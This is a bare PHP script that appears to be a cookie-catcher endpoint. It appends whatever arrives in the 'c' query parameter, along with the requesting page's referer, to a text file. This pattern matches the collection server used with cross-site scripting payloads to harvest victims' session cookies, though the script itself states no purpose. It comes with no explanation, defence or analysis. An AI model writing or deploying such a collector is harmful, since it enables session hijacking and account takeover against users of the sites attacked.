<?
    $f = fopen("c.txt",'a+');
    if (isset($_SERVER['HTTP_REFERER']))
    {
        fwrite($f,$_GET['c'] . "  @  " . $_SERVER['HTTP_REFERER'] . "\n");
    }
    else
    {
        fwrite($f,$_GET['c'] . "\n");
    }
    
    fclose($f);
